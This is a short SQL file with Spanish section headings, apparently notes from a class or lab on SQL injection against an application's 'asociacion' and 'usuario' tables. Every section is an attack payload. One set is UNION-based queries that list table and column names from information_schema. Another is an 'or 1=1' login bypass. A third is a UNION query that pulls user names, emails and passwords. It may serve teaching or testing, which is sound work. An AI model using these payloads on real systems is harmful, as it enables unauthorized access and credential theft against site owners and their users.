-------------------------------------------------------------------------------
-- 1. CONSULTAS CON INFORMATION_SCHEMA
-------------------------------------------------------------------------------
SELECT * FROM asociacion WHERE idAsoc = -1 
UNION SELECT NULL, NULL, NULL, NULL, NULL, GROUP_CONCAT(table_name), NULL, NULL, NULL 
FROM information_schema.tables 
WHERE table_schema = DATABASE();

SELECT * FROM asociacion WHERE idAsoc = -1 
UNION SELECT NULL, NULL, NULL, NULL, NULL, GROUP_CONCAT(column_name), NULL, NULL, NULL 
FROM information_schema.columns 
WHERE table_name = 'usuario';

-------------------------------------------------------------------------------
-- 2. ATAQUES DE LOGIN (BYPASS DE AUTENTICACIÓN)
-------------------------------------------------------------------------------
SELECT * FROM usuario WHERE nombre = 'admin' or '1' = '1' -- ' AND contrasenia = 'casdadsas';

-------------------------------------------------------------------------------
-- 3. OBTENCIÓN DE DATOS DEL USUARIO (EXTRACCIÓN DE CREDENCIALES)
-------------------------------------------------------------------------------
SELECT * FROM asociacion WHERE idAsoc = -1 
UNION SELECT NULL, NULL, NULL, NULL, NULL, GROUP_CONCAT(nombre, ' | ', correo, ' | ', contrasenia SEPARATOR ' --- '), NULL, NULL, NULL 
FROM usuario;